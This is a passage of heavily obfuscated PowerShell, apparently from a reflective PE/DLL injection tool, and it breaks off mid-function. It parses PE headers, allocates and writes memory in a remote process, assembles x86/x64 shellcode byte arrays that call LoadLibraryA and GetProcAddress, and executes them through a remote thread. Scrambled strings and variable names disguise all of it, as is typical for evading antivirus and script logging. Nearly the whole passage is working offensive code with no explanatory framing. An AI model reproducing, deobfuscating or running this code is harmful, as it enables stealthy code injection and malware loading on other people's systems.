        
        return ${PEin`FO}
    }


    
    
    Function gEt`-`PEdEtAi`L`EdINFo
    {
        Param(
        [Parameter( pOSITIoN = 0, mANdatORY = ${T`RUe})]
        [IntPtr]
        ${P`Eha`NdLE},
        
        [Parameter(pOsiTIoN = 1, maNdAtory = ${T`RUE})]
        [System.Object]
        ${WIN`3`2tyPes},
        
        [Parameter(POsITION = 2, mandatoRY = ${TR`UE})]
        [System.Object]
        ${wIn3`2C`o`NStAnTS}
        )
        
        if (${pE`H`AnDle} -eq ${nU`Ll} -or ${pEHA`N`dLe} -eq  (GET-vAriABle  pefZ6J -va  )::"Z`Ero")
        {
            throw ("{1}{0}{5}{3}{4}{2}{6}"-f'EHandle','P','IntPtr.Zer','nul','l or ',' is ','o')
        }
        
        ${P`eInfO} = &("{1}{0}{2}"-f 'w','Ne','-Object') ("{2}{3}{4}{0}{1}"-f'e','ct','Sys','tem.Ob','j')
        
        
        ${N`THea`De`RSinfO} = &("{2}{1}{0}{3}" -f'NtH','-Image','Get','eaders') -PEHandle ${P`Eh`ANdle} -Win32Types ${W`In32ty`peS}
        
        
        ${pein`FO} | &("{2}{1}{3}{0}" -f 'r','e','Add-M','mbe') -MemberType ("{3}{2}{0}{1}" -f 'r','ty','otePrope','N') -Name ("{0}{1}{2}" -f'PEHa','n','dle') -Value ${pEha`N`dLe}
        ${P`Ei`NfO} | &("{2}{0}{1}"-f 'dd-Me','mber','A') -MemberType ("{1}{0}{2}"-f'Prop','Note','erty') -Name ("{2}{0}{4}{1}{3}"-f 'N','DE','IMAGE_','RS','T_HEA') -Value (${n`ThE`Aders`INfo}."Im`AGE_`NT_HE`A`DERS")
        ${PeIN`FO} | &("{0}{2}{1}" -f'Add-','mber','Me') -MemberType ("{2}{1}{0}" -f'rty','tePrope','No') -Name ("{1}{0}{2}" -f'tHeadersP','N','tr') -Value (${NTH`eADerSI`N`FO}."nT`headErs`P`TR")
        ${PEI`NfO} | &("{1}{2}{0}"-f 'er','Add-M','emb') -MemberType ("{0}{1}{2}" -f'NotePr','o','perty') -Name ("{1}{0}"-f 'it','PE64B') -Value (${nT`h`EadeR`SIn`Fo}."pE64`B`It")
        ${P`e`InFO} | &("{3}{0}{1}{2}"-f'd','-Memb','er','Ad') -MemberType ("{1}{0}{2}" -f 'P','Note','roperty') -Name ("{0}{2}{1}" -f'SizeOfIma','e','g') -Value (${nT`h`eA`deRSi`NFO}."image_`NT_`hE`ADERs"."oPTi`o`N`AlhE`ADer"."sIZeof`i`MAGE")
        
        if (${p`E`iNfO}."P`e6`4bIT" -eq ${T`RUe})
        {
            [IntPtr]${Secti`ONhea`D`e`Rptr} = [IntPtr](&("{4}{1}{2}{3}{0}{5}" -f 'nsigne','d-S','ignedInt','AsU','Ad','d') ([Int64]${PeI`N`FO}."N`THEa`DERsP`TR") ( (  lS  VAriABle:ZnDo  ).ValuE::"SI`ze`OF"([Type]${W`IN32T`Y`PeS}."iMAGe`_Nt_HE`A`DE`RS64")))
            ${p`ei`NFo} | &("{2}{0}{1}"-f'd-M','ember','Ad') -MemberType ("{2}{1}{0}" -f 'ty','r','NotePrope') -Name ("{4}{3}{1}{0}{2}"-f 'nHe','o','aderPtr','ti','Sec') -Value ${s`eCtioNH`E`AdEr`Ptr}
        }
        else
        {
            [IntPtr]${SEctIOnheAD`ER`p`Tr} = [IntPtr](&("{0}{3}{1}{2}" -f'Add-Sign','n','tAsUnsigned','edI') ([Int64]${p`EiN`FO}."nth`e`ADerSptr") ( (GEt-CHiLdiTEm vAriabLE:zNdO  ).vAluE::"sizE`OF"([Type]${wI`N3`2`TYPEs}."ImAgE_N`T`_`hEaDe`Rs32")))
            ${P`EinFO} | &("{0}{1}{2}{3}" -f'A','dd-','Mem','ber') -MemberType ("{1}{2}{3}{0}" -f'erty','N','otePr','op') -Name ("{3}{4}{0}{1}{2}"-f'ionHea','derP','tr','Sec','t') -Value ${sECti`On`Hea`d`erpTR}
        }
        
        if ((${nThe`Ader`SinFO}."I`mAg`e`_n`T_HeadErs"."fILEHea`D`er"."cHaRA`CtEriST`iCs" -band ${WIN`32Con`StAnTS}."I`mage_`F`Ile_`dlL") -eq ${WiN`32`Co`NsT`AntS}."IMaGE`_`FIle_d`Ll")
        {
            ${Pe`I`NfO} | &("{0}{1}{2}" -f 'Add','-','Member') -MemberType ("{2}{0}{1}" -f 'otePrope','rty','N') -Name ("{1}{0}{2}"-f 'i','F','leType') -Value 'DLL'
        }
        elseif ((${NtHE`ADErS`i`NFO}."IM`AgE_Nt`_HE`A`dErS"."F`Il`eHeAdEr"."cHAr`Act`eriS`TiCS" -band ${W`I`N32Con`stANts}."I`M`AGE_fil`e_ex`E`C`UTABLE_im`AGE") -eq ${WIN32`conSTAN`TS}."iMaGe_Fi`l`E_e`XecUt`AbLE`_i`MAge")
        {
            ${pEi`NFo} | &("{0}{1}{2}"-f'Add-M','embe','r') -MemberType ("{2}{0}{1}{3}"-f 'rop','e','NoteP','rty') -Name ("{1}{0}{2}"-f'p','FileTy','e') -Value 'EXE'
        }
        else
        {
            Throw ("{5}{3}{1}{4}{0}{2}" -f'n EXE or ','ot ','DLL','is n','a','PE file ')
        }
        
        return ${pe`INFo}
    }
    
    
    Function IM`POrt-dL`l`iNremO`TeProCess
    {
        Param(
        [Parameter(PoSItIoN=0, MaNDatORY=${T`Rue})]
        [IntPtr]
        ${REMO`T`epRoc`hanDlE},
        
        [Parameter(PoSItIon=1, MaNdAtOrY=${t`RUE})]
        [IntPtr]
        ${imPORt`d`lL`PAt`HptR}
        )
        
        ${P`TrsI`zE} =   (ls  ("VARiab"+"L"+"e:zN"+"do")).valUe::"siz`EoF"([Type][IntPtr])
        
        ${Imp`o`RTDll`P`ATH} =   $zNDo::("{1}{4}{0}{3}{2}" -f'A','Pt','si','n','rToString').Invoke(${ImPO`R`Tdl`LPAtH`PTR})
        ${Dll`pAtH`SIZe} = [UIntPtr][UInt64]([UInt64]${I`mpo`RtDl`L`patH}."LEng`TH" + 1)
        ${RI`m`PORTD`l`LPA`THpTR} = ${wIn3`2FuN`CTIO`NS}."VI`RtuAlAL`locex"."i`N`VOke"(${rEMO`TeP`R`ocHanDle},   (  gci ('VARIaB'+'l'+'E:'+'PEfz6'+'J') ).VALuE::"Ze`RO", ${DLlpa`T`Hs`IzE}, ${WIN`3`2co`NsTantS}."m`Em_`coMm`It" -bor ${win`32c`Onst`AnTs}."mE`M_RES`ERve", ${wIN3`2c`oNSTan`Ts}."PA`ge`_ReaD`Write")
        if (${ri`MPO`R`TDLlP`A`THptr} -eq  (gEt-VAriabLe  ("PEfZ6"+"J")  ).VaLUE::"Ze`Ro")
        {
            Throw ("{7}{3}{5}{6}{8}{2}{1}{0}{4}" -f'proce','mote ','re',' allocate m','ss','emo','ry i','Unable to','n the ')
        }

        [UIntPtr]${nu`MbY`TE`SW`Ritten} =  ( gEt-ChilDitEM  ('variA'+'BL'+'E:CR98'+'p')  ).ValuE::"Ze`Ro"
        ${Su`cCess} = ${Win`3`2fUnct`i`onS}."WR`I`Teproce`s`sMEmOrY"."In`V`oKE"(${R`e`M`O`TEpROCHanDLe}, ${riMP`orTDl`lPaT`HP`Tr}, ${I`mpo`RTD`LlPaTHp`Tr}, ${dL`LpaTh`SIze}, [Ref]${NUMbyt`eSw`RIt`T`en})
        
        if (${s`UCcEss} -eq ${fA`lSe})
        {
            Throw ("{10}{7}{9}{2}{5}{3}{1}{0}{6}{4}{8}"-f'm','e',' path','o r','pr',' t','ote ','ite','ocess memory',' DLL','Unable to wr')
        }
        if (${dl`lP`A`THsizE} -ne ${numB`y`TES`wR`iTtEn})
        {
            Throw ((("{5}{11}{14}{12}{8}{3}{7}{4}{0}{2}{1}{6}{10}{9}{13}{15}" -f 'ting','ath to lo',' a DLL p','d amount o','en wri','Di','ad','f bytes wh','cte','e ',' to th','dnN','write the expe','remote proces','Kut ','s'))."ReP`LaCE"('NKu',[stRINg][chaR]39))
        }
        
        ${k`erNEl`32`HANdle} = ${WIn32f`UNC`T`iONs}."ge`TMoD`UlEHAnDLe"."inv`oKe"(("{0}{1}{2}"-f'ke','rnel32.d','ll'))
        ${lo`AdLiBra`RYA`A`dDR} = ${WI`N`3`2fuNCtiOns}."getprO`Ca`ddR`ESs"."IN`VoKE"(${Ker`Nel3`2`hAndle}, ("{2}{1}{0}"-f'adLibraryA','o','L')) 
        
        [IntPtr]${D`LL`ADDRe`SS} =   $pEFZ6J::"Z`ERO"
        
        
        if (${P`eiN`Fo}."p`e64b`It" -eq ${tr`Ue})
        {
            
            ${L`oAD`LIBRa`RYArEtmEM} = ${WIn32`FU`NCtioNs}."Vi`RtUa`LALLO`CEx"."inVo`ke"(${rEMoT`eP`Roc`h`A`NdlE},   (IteM  ("VaRi"+"A"+"Ble:PEFz6J")).VAlUE::"Ze`Ro", ${d`llPAT`hsi`ze}, ${wIN32`CO`NsTAnts}."mEM_C`o`mMit" -bor ${WI`N32CO`NsTANTs}."meM_R`Es`erve", ${WiN`32C`o`NsTaNTs}."paGe`_REaDW`RITE")
            if (${l`oaDLiBR`AR`YaR`E`TMem} -eq   ( get-variablE PEFz6J  -VAlUE )::"Z`ERo")
            {
                Throw ("{8}{5}{1}{12}{7}{0}{2}{9}{4}{3}{13}{10}{6}{11}" -f 'emor','e to','y i','emote proces','r','l',' the r','e m','Unab','n the ','for','eturn value of LoadLibraryA',' allocat','s ')
            }
            
            
            
            ${loA`DLi`BR`ArYs`C1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            ${loAD`l`iBRArY`SC2} = @(0x48, 0xba)
            ${loa`Dl`ibRAryS`C3} = @(0xff, 0xd2, 0x48, 0xba)
            ${l`oa`DLibr`ARySC4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            ${SC`L`En`Gth} = ${L`oaD`LIBRar`ySC1}."lEng`Th" + ${loa`dli`Br`ARYsC2}."lEN`G`Th" + ${LoA`d`l`ibr`ARYsc3}."L`enG`TH" + ${lOA`D`L`Ibra`RYsc4}."LeN`gth" + (${PTR`sizE} * 3)
            ${Sc`PSm`Em} =  ( DIr  ("variAb"+"l"+"e:Zn"+"Do")  ).vALUe::("{0}{2}{1}" -f'Alloc','bal','HGlo').Invoke(${Sc`lEng`Th})
            ${sCps`M`EmoRiGINAL} = ${scpS`M`Em}
            
            &("{3}{2}{5}{0}{4}{1}" -f 'BytesT','Memory','r','W','o','ite-') -Bytes ${loA`dlI`Bra`R`ySc1} -MemoryAddress ${sC`psm`Em}
            ${ScPs`M`em} = &("{3}{2}{6}{5}{4}{1}{0}" -f'ed','ign','-SignedI','Add','ns','sU','ntA') ${ScpsM`em} (${lOa`d`lIB`Ra`RYsC1}."lEN`gTH")
             (  GcI ("Vari"+"A"+"b"+"le:zNDO")  ).VAlUe::("{0}{3}{2}{1}" -f 'St','eToPtr','ctur','ru').Invoke(${rIMpORT`dL`Lpat`hpTr}, ${Sc`p`sMem}, ${fa`Lse})
            ${sCPs`MEM} = &("{4}{1}{5}{3}{0}{2}"-f 'Un','-Sig','signed','edIntAs','Add','n') ${SC`ps`mem} (${P`TRSIze})
            &("{3}{2}{0}{1}"-f'BytesT','oMemory','e-','Writ') -Bytes ${L`oa`dLIBrA`Ry`SC2} -MemoryAddress ${S`cPsm`em}
            ${scp`SMeM} = &("{2}{0}{4}{1}{3}" -f'nedIntA','gn','Add-Sig','ed','sUnsi') ${S`CpsMEm} (${loaD`L`ibRAr`ySc2}."LeN`GtH")
              ( GET-VARiAblE ZndO -vALueo )::("{0}{3}{2}{1}{4}" -f'S','reTo','u','truct','Ptr').Invoke(${L`oaDLI`BRAr`yaAD`dr}, ${scPS`m`eM}, ${F`AL`se})
            ${sC`P`smEM} = &("{4}{1}{0}{2}{3}"-f'ed','ign','IntAsUnsi','gned','Add-S') ${S`C`pSMEM} (${PTR`SI`Ze})
            &("{4}{1}{0}{2}{3}" -f '-','rite','B','ytesToMemory','W') -Bytes ${lOaD`LIB`RARys`c3} -MemoryAddress ${Sc`psmem}
            ${scPS`m`EM} = &("{0}{2}{3}{5}{4}{1}"-f'Add-Si','signed','gned','I','sUn','ntA') ${Sc`ps`meM} (${l`oaD`L`ibRaRYSc3}."L`eNg`Th")
              $znDo::("{1}{2}{0}" -f 'oPtr','St','ructureT').Invoke(${lO`AD`LiBrarYA`REt`Mem}, ${scPs`M`eM}, ${f`ALse})
            ${Scp`sm`eM} = &("{4}{1}{2}{0}{3}" -f 'IntAsUnsig','-Signe','d','ned','Add') ${sCps`M`EM} (${ptrS`I`ZE})
            &("{2}{1}{4}{3}{0}" -f'ory','Bytes','Write-','oMem','T') -Bytes ${L`oAD`LIB`RarYsC4} -MemoryAddress ${sCp`S`MEm}
            ${s`C`PSmEm} = &("{4}{0}{2}{3}{5}{1}"-f'ig','nsigned','n','edIntAs','Add-S','U') ${sC`PSM`EM} (${l`OAd`Li`BRarYsC4}."l`enG`TH")

            
            ${RsCA`d`dR} = ${W`IN3`2fuN`CTI`oNs}."V`irTUa`L`AlLOc`Ex"."Inv`oKe"(${reM`Ot`eP`ROchandLe},  $pEFZ6j::"ZE`Ro", [UIntPtr][UInt64]${SCl`E`NgTH}, ${wI`N`32`COnSTan`Ts}."mem_C`oM`miT" -bor ${wIN32C`oNs`T`A`NTS}."mE`M_`ReSeR`VE", ${W`In32co`N`sTANTS}."p`A`g`e_`Exe`CUTe_rEAdWRItE")
            if (${rScA`d`dr} -eq   $peFZ6j::"zE`Ro")
            {
                Throw ("{3}{8}{4}{1}{0}{6}{7}{5}{9}{2}"-f' ','ocate memory in the','e','Un','ll',' for shellc','remote pr','ocess','able to a','od')
            }
            
            ${Su`cCeSS} = ${w`I`N32Fu`NCTIo`NS}."W`Ri`T`ePrO`CEs`sMEmORY"."In`Vo`ke"(${reM`Ote`PRoC`Ha`NdLe}, ${RSC`AddR}, ${Sc`psmeMOR`IgInAL}, [UIntPtr][UInt64]${scLE`N`gtH}, [Ref]${Nu`mbYTe`sWR`I`TteN})
            if ((${suc`c`eSS} -eq ${fa`l`sE}) -or ([UInt64]${nuMbyT`ES`wRi`TTEn} -ne [UInt64]${SC`L`ENGTH}))
            {
                Throw ("{2}{6}{1}{10}{8}{4}{5}{9}{3}{7}{13}{14}{12}{0}{11}"-f'emo','ble ','U','remo','llco','de to','na','te pr','te she',' ','to wri','ry.',' m','o','cess')
            }
            
            ${rTHR`E`AD`HaN`DLe} = &("{3}{2}{4}{1}{0}" -f 'd','Threa','Re','Create-','mote') -ProcessHandle ${REM`OtEpR`o`chAn`dle} -StartAddress ${r`ScAddR} -Win32Functions ${wI`N3`2FuncTI`ONs}
            ${Re`s`ULT} = ${w`IN32fu`N`cTio`NS}."WAiTfoRsi`NGL`Eo`B`J`Ect"."INV`oKE"(${R`ThREad`HaNd`Le}, 20000)
            if (${Res`U`lt} -ne 0)
            {
                Throw ("{0}{2}{8}{14}{13}{12}{1}{9}{4}{3}{11}{10}{5}{7}{6}" -f 'Ca',' to c','ll to','P',' Get','ail','d.','e',' Create','all','s f','rocAddres','oteThread','m','Re')
            }
            
            
            [IntPtr]${R`e`T`UrNVAl`mEm} =  (GEt-iTEM VaRIable:zNDO  ).VAlUE::("{0}{2}{1}" -f 'AllocHGlo','al','b').Invoke(${PT`RS`iZE})
            ${ReS`U`lT} = ${wIn3`2`F`UNCtIoNS}."rE`A`Dproces`sMemORy"."iN`V`OKE"(${remoTE`prOChA`N`dle}, ${LO`AD`Li`BrARyaRET`M`EM}, ${rET`URn`VaL`MeM}, [UIntPtr][UInt64]${Pt`Rs`izE}, [Ref]${NuMb`YtES`WrittEN})
            if (${r`es`ULt} -eq ${F`ALSe})
            {
                Throw ("{5}{4}{6}{1}{2}{3}{0}"-f'emory failed','to R','e','adProcessM','a','C','ll ')
            }
            [IntPtr]${DLLaDd`R`EsS} =  (  gET-VaRIaBle  znDO -valuEOnly )::"PT`RtOS`T`Ru`CTuRE"(${rET`URn`VA`LMeM}, [Type][IntPtr])

            ${Win32fu`NCTi`o`NS}."V`irT`Ua`lfR`EeeX"."inv`oke"(${rEMoTEP`ROC`h`AND`Le}, ${l`OAd`LI`BrAR`YAREtmEM}, [UIntPtr][UInt64]0, ${wi`N32`cO`NstanTS}."MeM_rE`Le`ASe") | &("{1}{0}{2}"-f 'l','Out-Nu','l')
            ${WI`N3`2FuNc`TiOns}."v`IrtUA`LfRe`eeX"."I`NvOKe"(${rEM`oT`ePro`CH`AnDlE}, ${rS`C`AdDr}, [UIntPtr][UInt64]0, ${WIn32`cONs`T`ANtS}."MEM_R`el`eASE") | &("{0}{2}{1}" -f'Ou','ll','t-Nu')
        }
        else
        {
            [IntPtr]${R`Th`ReAdh`An`dle} = &("{0}{3}{1}{4}{2}"-f'Cre','emot','ead','ate-R','eThr') -ProcessHandle ${R`eMoT`epro`C`hANd`le} -StartAddress ${LO`ADl`iBr`ARyA`A`Ddr} -ArgumentPtr ${R`imPORTdll`PAT`hPTR} -Win32Functions ${wiN`32f`UNCTIO`Ns}
            ${re`sULt} = ${WiN3`2`FuncTIOnS}."waI`T`FOrS`inGL`Eobje`ct"."I`NvokE"(${r`T`hrEA`DhaNdLe}, 20000)
            if (${RES`ULT} -ne 0)
            {
                Throw ("{0}{8}{1}{7}{3}{2}{5}{4}{9}{6}"-f'Call to Cre','eRemoteT','l','ad to ca','ProcA','l Get',' failed.','hre','at','ddress')
            }
            
            [Int32]${ex`i`TCoDe} = 0
            ${ReSu`lT} = ${Win3`2F`U`N`CTionS}."g`ETeX`ItCodEtHR`eaD"."In`VoKe"(${rth`ReAdhAn`dlE}, [Ref]${E`XIT`Co`dE})
            if ((${RE`SU`LT} -eq 0) -or (${Ex`IT`COdE} -eq 0))
            {
                Throw ("{4}{0}{2}{1}{6}{7}{3}{5}"-f' to','etE',' G','Thread fa','Call','iled','x','itCode')
            }
            
            [IntPtr]${DlLa`d`Dr`ESs} = [IntPtr]${EX`IT`coDE}
        }
        
        ${WiN`32fUn`cT`I`ONs}."VI`Rt`UAl`FReEEx"."I`NV`OKe"(${R`Emot`epRoChaND`le}, ${RImpOrTD`lLp`AT`hPtR}, [UIntPtr][UInt64]0, ${win32`CoNStaN`Ts}."mem_R`Ele`Ase") | &("{1}{0}"-f'l','Out-Nul')
        
        return ${DlLaDD`R`eSs}
    }
    
    
    Function Get-`ReM`OT`EprOCAdd`REss
    {
        Param(
        [Parameter(pOSItiON=0, MaNdATORY=${T`RUE})]
        [IntPtr]
        ${REm`OTe`prOCHa`N`dLe},
        
        [Parameter(POsItiOn=1, mandatory=${Tr`UE})]
        [IntPtr]
        ${rEMO`T`EDL`LhANDle},
        
        [Parameter(POsitIon=2, maNDaTORy=${tR`Ue})]
        [IntPtr]
        ${fu`NcTi`onNAM`e`ptr},

        [Parameter(pOsItIoN=3, ManDATORY=${TR`Ue})]
        [Bool]
        ${lOADBYORd`i`NAL}
        )

        ${P`Tr`sIzE} =   ( GEt-ChildIteM ('v'+'a'+'Ria'+'BLE:ZNdo')  ).Value::"S`izEOf"([Type][IntPtr])

        [IntPtr]${RF`UncN`AMEPTr} =   (get-vAriAblE  ('pE'+'Fz6'+'J')  ).valuE::"Z`ERo"   
        
        if (-not ${lO`AdbyOrdIn`AL})
        {
            ${F`Un`cTion`NAME} =   $Zndo::("{0}{2}{1}{3}" -f'PtrToSt','ngAns','ri','i').Invoke(${FuncTIoNN`A`meP`TR})

            
            ${F`Un`C`TiOnNa`mESize} = [UIntPtr][UInt64]([UInt64]${fuNct`i`ONN`A`Me}."leng`TH" + 1)
            ${R`Fu`NcnaMEP`Tr} = ${wi`N32FuNCT`Io`Ns}."VI`RTu`ALAlLoCEX"."INv`o`ke"(${REMoTE`prOcH`AnD`LE},   (gi  vARIaBLe:PeFZ6j  ).VALuE::"ze`Ro", ${fUnc`T`ionn`AMES`Ize}, ${wI`N3`2`cOnstaN`TS}."m`E`M_cOMMiT" -bor ${WiN`32co`NstAN`Ts}."M`em_rE`seRVe", ${WiN`32CO`NSt`ANts}."PAGe`_RE`ADwRi`Te")
            if (${Rf`UNc`NaM`eP`TR} -eq  $PeFZ6J::"Ze`RO")
            {
                Throw ("{4}{3}{2}{10}{9}{0}{8}{5}{7}{6}{1}"-f ' in','ess','cate mem','e to allo','Unabl','the','te proc',' remo',' ','y','or')
            }

            [UIntPtr]${num`ByT`esWR`i`Tt`EN} =   (VariablE ('CR'+'98P') -va)::"Z`eRO"
            ${S`UCc`eSs} = ${w`iN32FunctI`o`NS}."WRI`TEPROc`EsSMeM`O`RY"."i`Nv`Oke"(${R`e`mo`TEPROchanDLE}, ${Rf`UNc`NAME`pTr}, ${fuNct`I`onnA`Me`pTR}, ${Fun`ctioN`NAm`Esi`ze}, [Ref]${NU`MbYTeswri`T`T`en})
            if (${S`UC`CesS} -eq ${faL`Se})
            {
                Throw ("{9}{3}{6}{11}{5}{7}{10}{1}{2}{0}{4}{8}" -f'e proc',' ','to remot','a','ess m',' D','ble to wr','L','emory','Un','L path','ite')
            }
            if (${fuN`CTiOnnAMes`i`zE} -ne ${Nu`MBYtE`Sw`Ri`TT`en})
            {
                Throw ((("{10}{12}{11}{9}{5}{13}{3}{16}{7}{0}{2}{1}{4}{8}{14}{6}{15}"-f 'hen ','ing a DLL path to','writ','ted amount',' load to ','h','ote pro','ytes w','t',' t','Did','write','n{0}t ','e expec','he rem','cess',' of b'))-F[Char]39)
            }
        }
        
        else
        {
            ${R`FuncN`AmEptr} = ${FUn`cT`I`Onn`AmeptR}
        }
        
        
        ${KeR`Nel`32ha`Nd`lE} = ${wI`N`3`2FUNCTI`ONs}."G`E`TmOdUL`EHAndLE"."I`NvOke"(("{2}{0}{1}"-f'3','2.dll','kernel'))
        ${GET`p`Ro`caDdr`E`SsadDr} = ${w`in32`F`UNCti`ONs}."gETPRoca`D`Dr`esS"."iNv`OkE"(${k`ERNE`L32`Hand`lE}, ("{0}{3}{2}{1}" -f'G','dress','ocAd','etPr')) 

        
        
        ${G`eTP`R`oC`AdDRe`sSr`eTmEM} = ${WIN32`F`U`NCtiOnS}."vir`T`UAl`AllOcex"."INvo`Ke"(${r`Em`OT`eprOC`haNDlE},  (  gCi  ('vaRiAb'+'LE:p'+'EF'+'Z6'+'J') ).VAlUE::"z`ERo", [UInt64][UInt64]${PTR`S`izE}, ${Wi`N32COnST`A`N`TS}."MEM`_cOM`MiT" -bor ${WIn`32Const`A`N`TS}."ME`M_r`Es`erVe", ${win`32Cons`TAn`Ts}."page`_r`Ea`dwRi`TE")
        if (${gET`Pr`ocAdDr`eS`sreTmEm} -eq  ( vARiaBlE ('PeF'+'Z6j') -VA  )::"zE`RO")
        {
            Throw ("{12}{10}{8}{14}{15}{16}{3}{2}{1}{4}{7}{5}{6}{9}{11}{0}{13}"-f 'f ',' process','mote','e re',' ',' re','turn valu','for the','llocate me','e ',' a','o','Unable to','GetProcAddress','mo','ry',' in th')
        }
        
        
        
        
        [Byte[]]${g`eTP`RocAdDR`e`sSSc} = @()
        if (${P`EI`NFO}."pE`64`BiT" -eq ${TR`Ue})
        {
            ${GETp`Roca`DD`Res`SSc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            ${g`eTPROCAdd`R`eSSsC2} = @(0x48, 0xba)
            ${getp`R`ocA`dDREsSsc3} = @(0x48, 0xb8)
            ${G`ETPR`oCadDRE`Ss`S`C4} = @(0xff, 0xd0, 0x48, 0xb9)
            ${G`etpr`oca`dd`R`ESssc5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            ${GE`TPROc`AdDre`SSsC1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            ${gE`T`Pr`O`CaddReSs`sc2} = @(0xb9)
            ${g`etPRo`CAddrES`SS`C3} = @(0x51, 0x50, 0xb8)
            ${GeT`p`RoCa`ddRe`s`sSc4} = @(0xff, 0xd0, 0xb9)
            ${gEt`pRO`Cadd`REs`ssc5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        ${SC`leNG`TH} = ${gE`TP`RoCadD`R`E`Sssc1}."leN`g`TH" + ${Get`p`RoCA`DDR`E`sSsC2}."Len`GTH" + ${G`ET`p`Ro`cadDrE`Sssc3}."lE`NGtH" + ${ge`T`Proca`DD`Re`SSsc4}."Le`N`gTh" + ${gE`TPR`Oc`AdDrEs`SsC5}."le`NGTH" + (${pT`R`sIzE} * 4)
        ${SCps`m`EM} =   (DIR vaRIAble:zNDO).vAluE::("{1}{3}{0}{2}"-f 'HGl','A','obal','lloc').Invoke(${SclE`NgTH})
        ${SCps`Me`morI`gIn`Al} = ${sCpS`MEM}
        
        &("{3}{1}{2}{0}" -f'mory','ite-Byte','sToMe','Wr') -Bytes ${g`E`Tpr`OcAdd`RE`sssc1} -MemoryAddress ${sc`p`SMEm}
        ${sc`pSm`EM} = &("{3}{1}{2}{0}" -f 'gned','tAs','Unsi','Add-SignedIn') ${SCpS`MEM} (${G`E`Tpr`Ocaddr`ESs`sc1}."lE`Ngth")
          (  gI VaRIAble:ZNdo ).vAlUE::("{0}{1}{2}"-f 'Struc','tureToP','tr').Invoke(${rEMOte`DLLHA`N`DLe}, ${Scp`SM`EM}, ${F`AlSE})
        ${ScP`SM`EM} = &("{1}{3}{2}{5}{0}{4}" -f'As','Add','SignedIn','-','Unsigned','t') ${sc`p`sMem} (${pT`R`SIZE})
        &("{0}{3}{2}{5}{4}{1}" -f'W','sToMemory','e-','rit','te','By') -Bytes ${getp`R`O`cadDre`sSsC2} -MemoryAddress ${sC`PSMem}
        ${s`cPs`mEM} = &("{3}{2}{5}{4}{0}{1}" -f 'Unsigne','d','d-Sig','Ad','IntAs','ned') ${s`c`psmem} (${G`et`prOCa`Dd`Ress`Sc2}."Le`N`gTH")
          ( geT-vARIabLe  ('z'+'ndo')  -valuEO )::("{1}{2}{0}"-f'ureToPtr','St','ruct').Invoke(${rFUncn`A`ME`PTr}, ${sc`p`smeM}, ${f`AlSe})
        ${Sc`pSM`eM} = &("{2}{4}{6}{1}{5}{3}{0}" -f'nsigned','gn','A','sU','dd-','edIntA','Si') ${S`CP`SMeM} (${p`TRsI`zE})
        &("{3}{2}{1}{0}" -f 'ry','tesToMemo','By','Write-') -Bytes ${GETPrO`CAd`dre`SsS`c3} -MemoryAddress ${sCps`meM}
        ${SCp`Sm`EM} = &("{2}{1}{3}{0}"-f'sUnsigned','nt','Add-SignedI','A') ${S`cPs`mEM} (${gEtP`ROcaddres`s`Sc3}."lEN`gTh")
          $ZndO::("{1}{2}{0}" -f'uctureToPtr','S','tr').Invoke(${g`E`TpR`OcAddR`EssAddR}, ${S`CPs`MEM}, ${Fa`lse})
        ${s`CPsMEm} = &("{2}{3}{0}{1}{5}{6}{4}" -f'd','IntA','Add-Sig','ne','ed','s','Unsign') ${SC`PSM`em} (${Pt`RsI`zE})
        &("{2}{3}{1}{0}"-f 'y','-BytesToMemor','W','rite') -Bytes ${gEt`PRoC`A`dDREssSc4} -MemoryAddress ${S`Cps`mEM}
        ${S`cP`SMEM} = &("{2}{5}{3}{6}{0}{1}{4}"-f'nsi','gn','Ad','igne','ed','d-S','dIntAsU') ${Sc`pSM`EM} (${gEt`P`ROcA`dDresS`sc4}."l`EngtH")
          ( GEt-vArIAblE  zndO -VaLUE)::("{2}{1}{3}{0}" -f 'r','ToP','Structure','t').Invoke(${getPR`OcA`ddREsSre`T`M`EM}, ${sC`P`Smem}, ${f`AlSE})
        ${S`Cps`mem} = &("{3}{2}{1}{0}{6}{5}{4}" -f 'IntAsU','ed','d-Sign','Ad','ned','sig','n') ${sCPs`MeM} (${P`Tr`sIzE})
        &("{1}{0}{3}{2}" -f'te-Byt','Wri','y','esToMemor') -Bytes ${g`e`TPRoCADDR`esS`SC5} -MemoryAddress ${S`Cp`smEM}
        ${SCP`S`MeM} = &("{1}{4}{3}{2}{0}"-f'ned','Add-Si','sig','nedIntAsUn','g') ${sC`pS`Mem} (${gEtp`RocaDD`R`E`SssC5}."L`ength")
        
        ${r`sCa`ddR} = ${wIN`3`2f`UNCtiONs}."Vi`RtUa`lA`l`LOCex"."INvo`ke"(${ReM`OTE`P`R`oCHand`le},  (  gEt-VaRiABLE  pEFZ6j ).VAluE::"ZE`RO", [UIntPtr][UInt64]${s`ClE`NGTH}, ${W`i`N3`2coNs`TaNTs}."mEM_`C`oMMIT" -bor ${WI`N3`2cO`N`stANts}."m`Em_rEs`ErVE", ${win32CO`NsT`A`NtS}."PaGE`_e`xEcuT`E_R`EADwrITE")
        if (${r`scaD`DR} -eq  $peFZ6j::"zE`Ro")
        {
            Throw ("{3}{13}{6}{4}{11}{9}{1}{8}{2}{7}{0}{12}{5}{10}" -f'e p','in th','remo','Unable ','te me',' for shellc','ca','t','e ',' ','ode','mory','rocess','to allo')
        }
        [UIntPtr]${N`U`m`B`YteSwrItteN} =   $cR98p::"Z`ERO"
        ${SUC`CE`ss} = ${wIN32f`UNC`TiO`Ns}."wRIT`EpRo`cESS`meMo`Ry"."i`NvOKE"(${remOTe`P`ROCH`AnDLe}, ${rsC`AD`DR}, ${s`cpsM`eMor`IGin`AL}, [UIntPtr][UInt64]${sc`LENg`Th}, [Ref]${nUMbyTes`WRiT`T`EN})
        if ((${S`Uc`cesS} -eq ${fa`L`se}) -or ([UInt64]${N`UMB`yteswriT`Ten} -ne [UInt64]${SCleng`TH}))
        {
